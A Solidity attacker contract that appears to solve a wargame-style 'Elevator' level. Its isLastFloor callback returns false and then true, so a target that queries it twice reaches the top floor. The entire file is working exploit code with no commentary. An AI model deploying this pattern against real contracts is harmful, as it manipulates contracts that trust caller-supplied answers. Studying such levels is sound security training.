pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}
contract ElevatorAttacker {
    address target;
    bool public firstTime;

    constructor(address _target) {
        target = _target;
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (!firstTime) {
            firstTime = true;
            return false;
        } else {
            return true;
        }
    }

    function attack()public {
        Elevator e = Elevator(target);
        e.goTo(1);
    }
}